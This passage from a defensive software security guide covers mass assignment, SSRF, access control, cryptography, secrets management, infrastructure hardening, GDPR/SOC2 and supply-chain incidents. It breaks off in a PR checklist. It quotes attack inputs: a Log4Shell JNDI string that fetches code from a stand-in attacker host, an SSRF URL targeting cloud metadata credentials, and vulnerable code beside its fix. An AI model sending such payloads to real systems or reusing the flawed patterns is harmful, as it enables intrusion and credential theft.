  const user = await User.findByPk(req.params.id);
  if (user.id !== req.user.id) return res.status(403).json({ error: 'Forbidden' });

  // User sends: { "name": "Alice", "email": "alice@example.com", "role": "admin" }
  await user.update(req.body);   // Updates ALL fields, including role
  res.json(user);
});
```

A user who discovers this endpoint can set `"role": "admin"` in the request body and grant themselves admin privileges. GitHub had this exact vulnerability in 2012 — a researcher used mass assignment to add his SSH key to another user's account, demonstrating full account takeover.

```javascript
// SAFE: explicitly allowlist updatable fields
const UPDATABLE_FIELDS = ['name', 'email', 'bio', 'avatar_url'];

app.put('/api/users/:id', authenticate, async (req, res) => {
  const user = await User.findByPk(req.params.id);
  if (user.id !== req.user.id) return res.status(403).json({ error: 'Forbidden' });

  const updates = {};
  for (const field of UPDATABLE_FIELDS) {
    if (req.body[field] !== undefined) {
      updates[field] = req.body[field];
    }
  }

  await user.update(updates);
  res.json(user);
});
```

The fix is an explicit allowlist of fields users can modify. `role`, `is_admin`, `email_verified`, `account_balance`, `created_at` — none of these appear in `UPDATABLE_FIELDS`. An attacker can send them in the request body all they want; the server ignores them.

In Rails, this is prevented by Strong Parameters (`params.require(:user).permit(:name, :email, :bio)`). In Django, specify `fields` in your serializer class. In Pydantic, define separate request schemas that only include the user-editable subset of the model. The pattern is identical everywhere: be explicit about which input is permitted.

### SSRF: When Your Server Makes Requests for You

SSRF (Server-Side Request Forgery) is the vulnerability that contributed to Capital One's $80M fine in 2019. Here's the scenario:

Your application has a feature that fetches a URL that the user provides — maybe a webhook URL tester, or an image-from-URL importer, or a PDF generator that renders a URL.

An attacker submits: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

That IP address (`169.254.169.254`) is the AWS EC2 instance metadata endpoint. It's only accessible from within the EC2 instance itself. But your server is the one making the request. And if your server is on EC2, this endpoint returns the IAM credentials attached to the instance.

The Capital One breach: an attacker found an SSRF vulnerability in a misconfigured WAF. They used it to hit the metadata endpoint, got IAM credentials, and used those credentials to download 100 million customer records from S3. The SSRF was the initial foothold; the overly permissive IAM role was the blast radius amplifier.

**Defense:**
- Validate URLs against an allowlist of permitted domains before fetching
- Block internal IP ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16` (AWS metadata)
- Resolve the URL to an IP address before making the request and check the resolved IP isn't internal (to prevent DNS rebinding attacks)
- Use a dedicated egress proxy for all external HTTP calls — route everything through it so you can enforce policies centrally
- On AWS: use IMDSv2, which requires a PUT request to get a token before any metadata can be retrieved, making SSRF exploits significantly harder

### Broken Access Control: The #1 Vulnerability

Broken access control has been #1 on the OWASP Top 10 since 2021, and it deserves the ranking. This isn't one vulnerability — it's a category of mistakes that all share the same root cause: you're not consistently checking whether the authenticated user is authorized to perform the action they're requesting.

**Insecure Direct Object Reference (IDOR)** is the most common flavor. Your API:

```
GET /api/invoices/12345
```

Returns the invoice with ID 12345. The user is authenticated. But does the code check whether the requesting user *owns* invoice 12345?

```python
# Broken: checks authentication but not authorization
@app.route('/api/invoices/<invoice_id>')
@login_required
def get_invoice(invoice_id):
    invoice = Invoice.query.get(invoice_id)
    return invoice.to_json()

# Fixed: enforces ownership with a scoped query
@app.route('/api/invoices/<invoice_id>')
@login_required
def get_invoice(invoice_id):
    invoice = Invoice.query.filter_by(
        id=invoice_id,
        user_id=current_user.id   # Must belong to this user
    ).first_or_404()
    return invoice.to_json()
```

The "broken" version checks that you're logged in but not that you own the invoice. Any logged-in user can view any invoice by changing the ID in the URL.

This is embarrassingly common. It's been found in major healthcare platforms (patients viewing other patients' records), financial services (users accessing other users' account statements), and SaaS products of every variety.

**Authorization rules belong in exactly one place: server-side middleware or a service.**

Don't scatter authorization checks through your business logic. Don't rely on the UI hiding the button. Don't check authorization in the frontend and skip it in the API because "it's the same code path." Define your authorization rules centrally, apply them consistently, test them explicitly.

**Privilege escalation** is the vertical flavor. A regular user somehow gains admin permissions. Common causes:
- APIs that allow users to modify their own role/permissions
- JWTs where the `role` claim can be forged because the signing key is weak
- Admin endpoints that check "is the user authenticated?" instead of "is the user an admin?"

Always test your privileged endpoints with non-privileged credentials as part of your regular test suite.

---

## 4. Cryptography for Engineers

Let me be upfront: you should not implement cryptography yourself. Cryptography is notoriously difficult to get right. The primitives are subtle, the failure modes are non-obvious, and mistakes in cryptography often look exactly like working code — until an attacker exploits them years later.

Your job is to understand which primitives to use, how to use them correctly, and what the common mistakes look like.

### Hashing: One-Way Transformations

Hashing takes an input and produces a fixed-size output. Given the hash, you can't reverse it to get the input (that's what "one-way" means). Given the input, you can always reproduce the hash (deterministic).

Hashing is used for:
- Storing passwords (the canonical use case)
- Verifying file integrity
- Digital signatures (as part of the signing process)
- Content-addressed storage (Git does this — every commit hash is derived from the content)

**For passwords specifically, the rules are absolute:**

Never use MD5, SHA-1, or SHA-256 for passwords. These are fast hashing algorithms — you can compute billions of them per second on a GPU. An attacker with a database dump can run offline brute-force attacks against fast hashes trivially.

Use a slow hashing algorithm designed for passwords:
- **bcrypt:** The classic. Use a cost factor of 12 or higher. Each factor increase doubles the computation time. At cost 12, bcrypt takes ~250ms per hash — fast enough for login, painfully slow for brute force.
- **argon2id:** The modern recommendation. Winner of the Password Hashing Competition. Configurable in time cost, memory cost, and parallelism. Tune it so hashing takes 250-500ms on your hardware.
- **scrypt:** Good, but argon2id is generally preferred for new systems.

```python
import bcrypt

# Storing a password:
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# Verifying a password:
bcrypt.checkpw(password.encode(), hashed)  # Returns True/False
```

The hashing function includes a random salt automatically. Never implement your own salting on top — the library handles it.

**For non-password integrity checks (file checksums, signed URLs, HMAC):** SHA-256 is appropriate and fast. SHA-3 is the modern alternative. Don't use MD5 or SHA-1 for anything security-related — both have practical collision attacks.

### Encryption: Keeping Secrets Confidential

Encryption transforms data such that only someone with the key can read it. Unlike hashing, it's reversible (by the keyholder).

**Symmetric encryption** uses the same key for encryption and decryption. It's fast. Use it for bulk data encryption.

The right choice: **AES-256-GCM** (AES with 256-bit key in Galois/Counter Mode).

GCM mode is an authenticated encryption scheme — it provides both confidentiality (data is secret) and integrity (data can't be tampered with without detection). If you use AES-CBC or AES-ECB without also computing an HMAC, you have confidentiality without integrity, which opens you to padding oracle attacks and other fun.

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = AESGCM.generate_key(bit_length=256)
nonce = os.urandom(12)  # 96 bits, never reuse with the same key
aesgcm = AESGCM(key)

ciphertext = aesgcm.encrypt(nonce, plaintext, None)
plaintext_out = aesgcm.decrypt(nonce, ciphertext, None)
```

Critical: never reuse a nonce with the same key. If you encrypt two different messages with the same key and nonce in GCM mode, an attacker can recover the plaintext of both messages and the authentication key. Generate a fresh random nonce for each encryption operation.

**Asymmetric encryption** uses a key pair: a public key (share freely) and a private key (guard with your life). Data encrypted with the public key can only be decrypted with the private key. Data signed with the private key can be verified with the public key.

- **RSA:** The classic. For signatures and key exchange. Use 2048-bit minimum, 4096-bit for long-term security. Slow.
- **Ed25519:** Modern elliptic curve signature algorithm. Faster than RSA, similar security at smaller key sizes. Prefer this for new systems.

Asymmetric crypto is used for TLS handshakes (to securely exchange a symmetric key), SSH, code signing, and JWTs (RS256, ES256 algorithms).

### Envelope Encryption: The Production Pattern

Here's the problem: you want to encrypt data in your database. You could use AES-256-GCM. But where do you store the key? In your database? That's not encryption — that's security theater. In environment variables? Better, but if your server is compromised, the key is exposed.

Envelope encryption is the solution:

1. Generate a **Data Encryption Key (DEK)** — a fresh AES-256 key per record (or per data class)
2. Encrypt your data with the DEK
3. Encrypt the DEK with a **Key Encryption Key (KEK)** — this lives in your KMS (AWS KMS, GCP KMS, HashiCorp Vault)
4. Store the encrypted DEK alongside the encrypted data

To decrypt:
1. Send the encrypted DEK to your KMS
2. KMS decrypts it and returns the plaintext DEK (the DEK never leaves your infrastructure boundary unencrypted in storage)
3. Decrypt your data with the plaintext DEK
4. Discard the plaintext DEK from memory

The KEK never leaves the KMS. The KMS logs every use of it. If you need to "rotate the key," you decrypt all the DEKs with the old KEK and re-encrypt them with the new KEK — you don't have to re-encrypt all the data.

AWS KMS makes this pattern straightforward. The `GenerateDataKey` API call returns both a plaintext DEK and an encrypted DEK in one call. You use the plaintext DEK to encrypt your data, store the encrypted DEK, and throw away the plaintext DEK. When you need to decrypt, call `Decrypt` with the encrypted DEK to get it back.

### Key Management in Practice: Where Keys Live and How They Die

Envelope encryption answers "how do I encrypt this data?" Key management answers "where do the keys live, who can use them, how do I know if they're compromised, and what happens when I rotate them?" These are harder questions.

**Key hierarchy.** In production, you almost never have a single key — you have a hierarchy:

```
Root Key (Hardware Security Module — never exportable)
  └── Key Encryption Keys (KMS-managed, one per data class or environment)
        └── Data Encryption Keys (generated per-record or per-data-class, stored encrypted)
              └── Your data (encrypted with the DEK)
```

The root key lives in hardware (an HSM — Hardware Security Module). The HSM is a tamper-resistant device that will destroy the key material if physically opened. AWS KMS's root keys live in HSMs. You never see them. AWS engineers cannot export them. The only operations you can do with them are encrypt/decrypt via the API, and every operation is logged.

**Key rotation.** Rotation means replacing an old key with a new one. The cadence depends on your threat model:
- Symmetric encryption keys (DEKs): rotate per-record or annually
- Signing keys for JWTs: rotate every 90 days (or when engineers leave who had access)
- TLS certificates: 90 days (Let's Encrypt enforces this)
- Customer-facing API keys: on compromise or on request; support rotation without downtime

Rotation is painful if you haven't designed for it. The common mistake: hardcoding a single key ID rather than storing the key ID alongside the ciphertext. When you rotate, old records were encrypted with the old key. If every piece of ciphertext knows its key ID, decryption always uses the right key. Re-encryption can happen lazily (decrypt with old key, re-encrypt with new key on next read) rather than requiring a big-bang migration.

AWS KMS makes this concrete:

```python
import boto3

kms = boto3.client('kms')

# Encrypt — returns ciphertext blob (includes key metadata)
response = kms.encrypt(
    KeyId='arn:aws:kms:us-east-1:123456789012:key/mrk-...',
    Plaintext=b'sensitive data here'
)
ciphertext_blob = response['CiphertextBlob']  # Store this

# Decrypt — KMS extracts the key ID from the ciphertext blob automatically
response = kms.decrypt(CiphertextBlob=ciphertext_blob)
plaintext = response['Plaintext']
```

The `CiphertextBlob` returned by KMS contains metadata identifying which key was used. When you call `Decrypt`, KMS reads that metadata and uses the correct key. If you've rotated the key, KMS keeps old versions for decryption while using the new version for new encryptions. You don't have to track key versions yourself for KMS-managed keys.

**Key access control.** The question "who can decrypt this data?" is answered entirely by "who has permission to call the KMS Decrypt API with this key." This makes authorization for encrypted data a KMS policy question, not an application policy question.

```json
{
  "Effect": "Allow",
  "Principal": {
    "AWS": "arn:aws:iam::123456789012:role/prod-api-service"
  },
  "Action": ["kms:Decrypt", "kms:GenerateDataKey"],
  "Resource": "*",
  "Condition": {
    "StringEquals": {
      "kms:EncryptionContext:service": "payments",
      "kms:EncryptionContext:environment": "production"
    }
  }
}
```

This key policy allows `prod-api-service` to decrypt, but only when the encryption context includes `service=payments` AND `environment=production`. A compromised dev service can't use this key to decrypt production payment data, even if it somehow gets access to the encrypted blobs. The encryption context is authenticated additional data that's checked on every KMS operation.

**Key compromise.** When you suspect a key is compromised, the response is:
1. Disable the key in KMS immediately — no new operations can use it
2. Rotate: generate a new key, decrypt old records with the old key (still possible after disabling, just prevents new use), re-encrypt with the new key
3. Audit all KMS CloudTrail logs for operations using the compromised key — when did it start, what was accessed, by whom?
4. Assess blast radius: what data was encrypted with this key?

The audit trail is critical. AWS CloudTrail logs every KMS API call — KeyId, caller identity, IP address, timestamp. This is your forensic record. When you need to know "did an attacker use this key to decrypt customer data?", the CloudTrail logs tell you.

**Secrets rotation without downtime.** The operational challenge: rotating database passwords or API keys without taking your service offline. The pattern:

```
Old secret: db-password-v1
New secret: db-password-v2

Step 1: Create new secret (db-password-v2) in the database and Secrets Manager
Step 2: Deploy new application version that tries v2 first, falls back to v1
Step 3: Verify all traffic is using v2 (audit logs show v1 has 0 successful connections)
Step 4: Remove v1 from the database and Secrets Manager
```

This "dual-version" window — where both old and new secrets are valid — is the key to zero-downtime rotation. Automate it. AWS Secrets Manager has built-in rotation for RDS databases that does this automatically on a schedule.

### TLS 1.3: The Handshake Gets Faster

TLS is what puts the "S" in HTTPS. It's the protocol that encrypts data in transit. TLS 1.3, released in 2018, is a significant improvement over TLS 1.2.

Key improvements:
- **1-RTT handshake** (vs 2-RTT in TLS 1.2): The client can send encrypted data immediately after the first round-trip, reducing latency
- **0-RTT resumption**: For returning clients, data can be sent in the first message with zero additional round trips (with caveats around replay attacks — don't use 0-RTT for non-idempotent requests)
- **Forward secrecy mandatory**: Every session uses ephemeral keys. Compromising the server's private key doesn't decrypt past sessions
- **Removed weak ciphers**: TLS 1.3 only supports AEAD cipher suites (like AES-GCM and ChaCha20-Poly1305). RC4, DES, 3DES, MD5, and export-grade ciphers are gone

Certificate management: use Let's Encrypt for free, auto-renewing TLS certificates. Set up auto-renewal well before expiry (certificates expire after 90 days). The number of production outages caused by expired certificates is absurd — LinkedIn, Azure, Cloudflare have all had incidents. Automate renewal.

### Secrets Management: The Part That Actually Matters in Practice

Log4Shell in December 2021 was the most acute reminder that dependency security matters. A zero-day in Log4j (the most-used Java logging library) allowed remote code execution via a single crafted log message. Systems were exploited within hours of disclosure.

But the damage from Log4Shell varied enormously. Systems with good secrets management had lower blast radius: even with RCE, attackers couldn't move laterally because there weren't hardcoded credentials to steal. Systems where developers had scattered AWS keys, database passwords, and API tokens throughout the codebase and environment variables were hit much harder.

**The rules:**
- **Never hardcode secrets.** Not in source code. Not in Dockerfiles. Not in CI scripts. Scanners like `truffleHog`, `gitleaks`, and GitHub's secret scanning catch this — but prevention is better.
- **Never commit secrets to git.** Even if you delete the file later, git history retains it. Use `git-secrets` or GitHub secret scanning push protection to prevent this at the push level.
- **Use a secrets manager.** HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager. These provide:
  - Centralized secret storage with access control
  - Audit logs of every secret access
  - Automatic rotation for many secret types
  - Dynamic secrets (Vault generates a database credential on demand, valid for 1 hour, automatically revoked)

**Dynamic secrets** are the gold standard. Instead of a static database password that lives forever, Vault talks to your database and creates a temporary user with a unique password when your application requests credentials. The credentials expire when the lease expires. If they're leaked, the damage is time-limited.

```bash
# Vault creates a temporary database user on demand
vault read database/creds/my-role
# Returns: username = "v-root-my-role-xxxxxxxx"
#          password = "A1a-xxxxxxxx"
#          lease_duration = "1h"
```

Your application reads credentials at startup and periodically refreshes them before they expire. The credential is short-lived and unique to your application instance.

---

## 5. Infrastructure Security

Code security matters. But the infrastructure your code runs on matters too. A perfectly secure application can be undermined by a misconfigured S3 bucket, an overly permissive security group, or a container running as root.

### Network Segmentation: The Moat, But Modern

Your infrastructure should be organized in tiers, and traffic between tiers should be explicitly allowed, not implicitly permitted.

The classic three-tier architecture:
- **Web tier** (public subnet): Your load balancer, edge services, public-facing APIs. Accessible from the internet on ports 80 and 443.
- **Application tier** (private subnet): Your application servers. Only accessible from the web tier, not the internet. Can initiate outbound calls but isn't reachable from outside.
- **Data tier** (private subnet): Your databases, caches, queues. Only accessible from the application tier. No outbound internet access.

Implement this with security groups (AWS) or network policies (Kubernetes). Security groups are stateful — if you allow outbound traffic on a connection, the response traffic is automatically allowed. This means you can have very restrictive inbound rules.

A database security group should look like:

```
Inbound:  TCP port 5432 FROM application-tier-security-group
Outbound: DENY all
```

Not:

```
Inbound: TCP port 5432 FROM 0.0.0.0/0   # Exposed to the entire internet
```

The number of production databases accidentally exposed to the internet is staggering. The Shodan search engine indexes them. Don't be one of them.

### WAF: Edge Protection

A Web Application Firewall sits in front of your application and filters requests based on rules. At the edge, before they even hit your servers:
- Block common attack patterns (SQLi, XSS, path traversal)
- Rate limiting by IP, user, or endpoint
- Geo-blocking if you don't serve certain regions
- Bot detection and CAPTCHA challenges

AWS WAF, Cloudflare WAF, and similar services provide managed rule sets maintained by security teams. You get the benefit of threat intelligence across millions of properties — attacks seen on one site are blocked for all.

WAFs are not a substitute for fixing vulnerabilities in your code. A sophisticated attacker will eventually find patterns that bypass your WAF rules. WAFs buy you time and block unsophisticated attacks. Fix the underlying vulnerability too.

### Container Security: Hardening the Runtime

Containers add an attack surface that's easy to misconfigure. The defaults are often insecure.

**Non-root users.** By default, Docker containers run as root. Root inside the container maps to root on the host with certain kernel vulnerabilities. Add to your Dockerfile:

```dockerfile
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser
```

And in your Kubernetes pod spec:

```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
```

**Read-only root filesystem.** If the attacker gets code execution inside your container, they can't write to the filesystem. They can't drop persistent malware. They can't modify the application binary. This doesn't stop all attacks, but it dramatically limits what an attacker can do.

**Drop capabilities.** Linux capabilities are fine-grained privileges. A container doesn't need `CAP_NET_ADMIN` or `CAP_SYS_ADMIN`. Drop everything, add back only what you need.

**Image scanning.** Scan container images for known CVEs before they reach production. Snyk, Trivy, and AWS ECR scanning integrate into CI/CD pipelines. Fail the build if critical vulnerabilities are found in your base image or dependencies.

**Base image hygiene.** Use minimal base images — `distroless` or Alpine-based. Fewer packages means a smaller attack surface. The `ubuntu:latest` base image has hundreds of packages you don't need and dozens of CVEs accumulated over time.

### Supply Chain Security: The SolarWinds Lesson, Applied

SolarWinds taught the industry that the software supply chain is an attack surface. Your code depends on hundreds of libraries. Those libraries have their own dependencies. Any one of them could be compromised.

**Lockfiles are not optional.** `package-lock.json`, `Pipfile.lock`, `go.sum`, `Gemfile.lock` — these pin exact dependency versions and their hashes. Without lockfiles, `npm install` might install a different (potentially compromised) version than the one you tested.

**Dependency scanning.** Tools like Dependabot (GitHub), Snyk, and OWASP Dependency-Check scan your dependencies for known CVEs. Set up automated PRs for security updates. Keep your dependencies current — being 6 months behind means you're 6 months behind on security patches.

**Software Bill of Materials (SBOM).** An SBOM is a complete list of every component in your software, like an ingredients list. Generating an SBOM as part of your build (using tools like Syft or the built-in SBOM generation in Docker Build) means you can quickly answer "are we affected by CVE-2021-44228?" (Log4Shell) by scanning the SBOM rather than manually checking every service.

**Signed builds.** Sign your container images and artifacts with tools like Sigstore/Cosign. Verify signatures before deploying. This ensures that what runs in production was actually produced by your CI/CD pipeline and hasn't been tampered with in the registry.

### SAST and DAST: Testing for Vulnerabilities

**SAST (Static Application Security Testing)** analyzes your source code without running it. Semgrep and CodeQL are the leading options. They can find:
- Hardcoded secrets
- SQL injection patterns
- Path traversal vulnerabilities
- Dangerous function usage

Run SAST in CI. Fail the build on high-severity findings. Tune the rules to reduce false positives so developers don't start ignoring them.

**DAST (Dynamic Application Security Testing)** tests your running application by sending crafted HTTP requests and observing responses. OWASP ZAP is the open-source leader. Burp Suite Enterprise is popular in larger organizations.

Run DAST against a staging environment (not production — it's active attack testing). DAST finds things SAST misses: authentication bypasses, business logic flaws, second-order injection.

Neither SAST nor DAST replaces human security review for complex components. But together they catch a wide class of vulnerabilities automatically.

---

## 6. Compliance & Privacy

Compliance often gets treated as bureaucratic overhead — a checkbox exercise to satisfy auditors. This is the wrong mental model. The controls that SOC2 and GDPR require are also the controls that prevent breaches and build user trust. Think of compliance as a floor, not a ceiling.

### GDPR: Engineering Implications

GDPR (General Data Protection Regulation) applies to any system that processes personal data of EU residents, regardless of where your company is based. The fines are substantial — 4% of global annual revenue or €20M, whichever is higher. British Airways' post-breach fine was £20M. Meta has been fined billions.

But the GDPR requirements that matter for engineers aren't primarily about fines — they're about respecting users' rights over their data.

**Right to erasure ("right to be forgotten"):** Users can request deletion of their personal data. You must be able to delete it within 30 days. This sounds simple until you have:
- User data replicated across multiple services
- Event sourcing or append-only audit logs that can't be modified by design
- Backups from the past 30 days that contain the user's data
- Analytics systems with historical data

For event sourcing systems, the elegant solution is **crypto-shredding**: encrypt the personal data in events with a user-specific key. When deletion is requested, delete the key. All past events containing that user's data are now unreadable — the data is effectively erased without modifying the event log.

For backups: document your backup retention policy. GDPR allows retaining data in backups if you have a documented policy and the backups are genuinely inaccessible (not being queried, only restored in disaster scenarios). When a backup containing deleted user data ages out of retention, it's gone.

**Data minimization:** Only collect the data you actually need. Not "might need one day." Not "it could be useful for analytics." Actually need for the stated purpose. Collect less data, have fewer compliance obligations, have smaller breach impact.

**Retention policies:** Define how long you keep different types of data and implement automated deletion. Logs older than 90 days? Delete them automatically. Session data older than 30 days? Auto-expire. Data you're not actively using is a liability.

**Consent management:** If you process data based on user consent (rather than legitimate interest or contract necessity), track exactly what they consented to, when, and be able to demonstrate it. Allow consent withdrawal. When consent is withdrawn, stop processing their data for that purpose immediately.

**Data processing agreements (DPAs):** Every third-party service that processes personal data on your behalf (Datadog, Mixpanel, Stripe, etc.) needs a signed DPA. This is a legal agreement where they commit to processing data in GDPR-compliant ways. Your legal team handles this, but you need to know which of your dependencies touch personal data.

### Data Classification: Knowing What You're Protecting

Not all data is equally sensitive. A tiered classification scheme lets you apply controls proportional to the risk.

| Classification | Examples | Controls |
|---|---|---|
| **Public** | Marketing copy, documentation, public API schemas | None required |
| **Internal** | Internal runbooks, employee handbooks, team metrics | Access controls, standard encryption |
| **Confidential** | Customer emails, payment data, internal financials | Strict access controls, encryption at rest/transit, audit logging |
| **Restricted** | SSNs, health records, authentication credentials, private keys | Highest controls, minimal access, comprehensive audit trail, specialized handling |

Define these tiers for your organization. Tag data stores with their classification. Apply controls consistently based on classification. When you're designing a new feature that touches Restricted data, you immediately know what controls are required.

### Audit Logging: The Security Black Box

When something goes wrong — and eventually something will — audit logs are how you reconstruct what happened. Who accessed which resource. When. What they did. From where.

Good audit logs:
- Record the **subject** (who), **action** (did what), **resource** (to what), **timestamp** (when), **context** (from where, with what result)
- Are **immutable** — append-only. Once written, they cannot be modified. Use an append-only log store (AWS CloudWatch with log group retention, Elasticsearch with appropriate policies)
- Are **shipped immediately** to a separate system. If your application server is compromised, the attacker shouldn't be able to modify logs on the same system
- Are **retained** per your compliance requirements. SOC2 requires 1 year. HIPAA requires 6 years. Define this explicitly.

What to log:
- Every authentication event (success and failure)
- Every authorization decision for sensitive resources
- All data access for Confidential and Restricted data
- All administrative actions (user creation, permission changes, configuration changes)
- All API calls from external parties

What not to log:
- Passwords or password hashes (obviously)
- Payment card numbers, SSNs, health data in the clear
- JWT payloads (might contain sensitive claims)
- API secrets or tokens

Structure your logs in a machine-readable format (JSON) so they can be queried programmatically. Include a correlation ID that ties a single user request across all services.

### SOC2: The Trust Framework

SOC2 is a voluntary compliance framework for service organizations that defines controls across five Trust Service Categories. Most B2B SaaS companies need SOC2 Type II (evidence of controls operating effectively over time, typically 6-12 months).

The engineering controls that SOC2 requires map almost perfectly onto good security practice:

**Access management:**
- Multi-factor authentication for all internal systems
- Access reviews at least quarterly — confirm everyone's permissions are still appropriate
- Offboarding procedures that revoke access within 24 hours of employee departure
- Principle of least privilege enforced (those IAM policies matter for compliance)

**Change management:**
- All code changes require peer review before merging
- CI/CD gates prevent untested or unreviewed code from reaching production
- Change records link deployments to the tickets/PRs that authorized them
- Ability to roll back any deployment

**Monitoring and alerting:**
- Infrastructure and application metrics with alerting on anomalies
- Security events surfaced to the security team
- Uptime and availability tracking
- Log retention as described above

**Incident response:**
- Documented incident response procedure (who to call, escalation paths, communication templates)
- Post-incident reviews (blameless postmortems) and remediation tracking
- Breach notification process (GDPR requires notification within 72 hours)

**Vendor management:**
- Inventory of third-party vendors with access to your systems or data
- Security review of vendors before onboarding
- DPAs in place for data processors

The work of being SOC2-compliant is largely the work of being a mature engineering organization. The audit process forces you to document controls you probably already have but haven't formalized. That documentation is valuable independently of the compliance outcome.

---

## 7. Supply Chain Security: When the Attack Comes from Inside the Build

The three supply chain incidents every engineer should know — not as horror stories, but as case studies in how the "trusted" parts of your stack became attack vectors.

### SolarWinds (2020): The Poisoned Update

The SolarWinds Orion platform is network monitoring software used by 33,000 organizations including U.S. federal agencies. In late 2020, researchers discovered that a malicious DLL — named `SolarWinds.Orion.Core.BusinessLayer.dll` — had been embedded in the legitimate, digitally signed Orion software updates since March 2020.

How it worked:
1. Attackers (later attributed to Russia's SVR) compromised SolarWinds' software build system — the machine that compiled and packaged the software
2. They injected their malicious code into the build step, so the compiled output contained the backdoor, but the source code did not
3. The resulting binary was signed with SolarWinds' legitimate code signing certificate
4. Organizations installed the update because it was signed by a trusted publisher

The malware lay dormant for up to two weeks, then began making DNS queries to its command-and-control infrastructure — using domain generation algorithms to blend in with normal DNS traffic. It checked whether it was running in a security analysis environment (looking for common AV/EDR tool processes) and aborted if so. It stayed dormant longer if certain conditions weren't met. It was designed to be patient.

18,000 organizations installed the backdoor. The attackers chose which targets to activate it against — primarily U.S. government agencies and cybersecurity firms. The breach wasn't discovered for months.

**What this teaches engineers:**

- The build system is part of your attack surface. Treat CI/CD infrastructure with the same rigor as production
- Code signing proves authenticity of the signer, not security of the content. Signed malware is still malware
- Reproduced builds (where the same source code always produces bit-identical output) make this attack detectable — the build output wouldn't match a reproduction from source
- Monitoring your own software's outbound network behavior post-deployment can catch C2 communication even if the initial compromise was perfect
- Separate build environments from corporate networks. The team that maintains SolarWinds' build infrastructure had the same network access as everyone else

### Log4Shell (2021): The Library That Was Everywhere

On December 9, 2021, a security researcher published a proof-of-concept exploit for CVE-2021-44228 in Apache Log4j. Within hours, internet-wide scanning began. Within days, ransomware groups and nation-state actors were actively exploiting it.

The vulnerability: Log4j, the most widely used Java logging library, supported a feature called JNDI lookup. If a logged string contained `${jndi:ldap://evil.com/payload}`, Log4j would make an outbound LDAP request to `evil.com` and load a Java class from the response, executing arbitrary code.

Every place your application logged user-controlled input was potentially vulnerable. Headers, form fields, usernames, even User-Agent strings — anywhere that ended up in a log line was an attack surface.

The scale of impact:
- Log4j was embedded in thousands of commercial and open-source products — including products that vendors didn't even know used it (it was a transitive dependency)
- Apple, Twitter, Amazon, Microsoft, Cloudflare, Minecraft, and thousands of others were affected
- The CISA emergency directive required all federal agencies to patch within days
- "LunaSec" estimated at the time that it affected 3 billion devices running Java

**What this teaches engineers:**

- Know your transitive dependencies. The SBOM (Software Bill of Materials) concept went from niche to urgent overnight. Organizations that had SBOMs could answer "are we affected?" in minutes. Others took weeks
- The blast radius of a logging library is enormous — everything logs
- Defense in depth matters even when a zero-day hits. Organizations with outbound network controls (egress firewall blocking unexpected LDAP/RMI traffic) were not exploitable even before patching
- Patch cadence matters. Organizations running Log4j 2.x were affected; those few still running 1.x were not (different vulnerability). But Log4j 2.x had added features and performance improvements over 1.x — the new features created the attack surface
- Subscribe to security advisories for your critical dependencies. Tools like Dependabot can't help you with a zero-day before a patch exists, but they put you in the habit of applying fixes immediately when they do

### xz Utils (2024): The Patient Attacker

In March 2024, a Microsoft engineer named Andres Freund noticed that SSH logins on his Debian system were slightly slower than expected and consuming more CPU than normal. He investigated. What he found: the xz Utils compression library (a dependency used by systemd, which handles SSH authentication on many Linux distributions) had been backdoored.

This wasn't a typical supply chain attack. The attacker — operating under the pseudonym "Jia Tan" — had spent two years contributing legitimate, high-quality patches to xz Utils. They built trust with the maintainer (who was burned out and grateful for the help). They arranged for "other" accounts (likely their own) to pressure the maintainer to add Jia Tan as a co-maintainer. Then, over months, they introduced the backdoor through a series of changes that each looked innocent in isolation.

The backdoor was injected through the build system's test scripts, not in the main source code — making it harder to spot in code review. The malicious binary was embedded in the release tarball but not in the git repository. Someone doing `git diff` against the source would not see it. The backdoor specifically targeted OpenSSH on glibc-based Linux systems, and only when systemd was used — it was designed to affect servers, not developer workstations.

The attack was caught before it reached stable releases of major distributions, due to Andres Freund's curiosity about SSH performance. It was extremely close.

**What this teaches engineers:**

- Social engineering attacks on open-source maintainers are real and sophisticated. Burnout in open-source maintainership is a security vulnerability
- The attack surface is not just the code — it's the build scripts, the release process, the tarballs. Verify that release artifacts match what git says
- Reproducible builds can detect this class of attack — a backdoored tarball will not reproduce from source
- No amount of code review catches a patient, capable attacker who is also contributing good code for two years
- Dependency pinning by hash (not just version) means you're running exactly what was reviewed, not whatever was published to a package registry yesterday

### The Engineering Response: Hardening Your Supply Chain

These three stories share a common theme: the attack came through a trusted channel. The defenses:

**Pin dependencies by cryptographic hash.** Don't just pin `log4j@2.14.1` — pin to the specific artifact hash. If the package registry serves a different artifact for that version (compromised registry, typosquatting, dependency confusion), your build fails.

```bash
# npm — package-lock.json contains SHA-512 hashes per package
# pip — use pip-compile with --generate-hashes
# go — go.sum contains hashes for every module version
pip install --require-hashes -r requirements.txt
```

**Generate and maintain an SBOM.** Know exactly what's in every build. When the next Log4Shell drops, you run `grep` on your SBOM, not a manual inventory of every service.

```bash
# Syft generates SBOMs from container images or directories
syft scan your-service:latest -o spdx-json > sbom.json

# Grype scans an SBOM against vulnerability databases
grype sbom:sbom.json
```

**Verify artifact signatures.** Sigstore/Cosign allows packages to be signed with short-lived certificates tied to the build pipeline identity (not long-lived private keys that can be stolen). Verify signatures before using artifacts.

**Separate build environments.** Your CI/CD pipeline should not have access to your production environment. Compromising CI should not allow compromising prod. Use separate IAM roles, secrets, and network access for build vs. deploy steps.

**Monitor outbound connections from your services.** A backdoored library will eventually try to phone home. If your services make unexpected outbound connections to strange IPs or domains, you want to know. Egress firewalls + anomaly detection on DNS queries catch C2 traffic that signature-based tools miss.

**Review the humans behind your critical dependencies.** This doesn't mean distrust all open-source contributors. It means: for your five most critical transitive dependencies, understand who maintains them, whether they're actively maintained, and what your plan is if they're abandoned or compromised.

---

## 8. Security Checklist for Every PR

Security review doesn't have to mean a formal security audit before every merge. It means building security questions into your regular code review practice. This checklist represents the fastest path to catching the most common issues — run through it when you're writing code and when you're reviewing a colleague's PR.

### Authentication & Authorization

- [ ] **Every endpoint that changes state is authenticated.** No unauthenticated `POST`, `PUT`, `PATCH`, `DELETE` endpoints unless the public access is intentional and explicit.
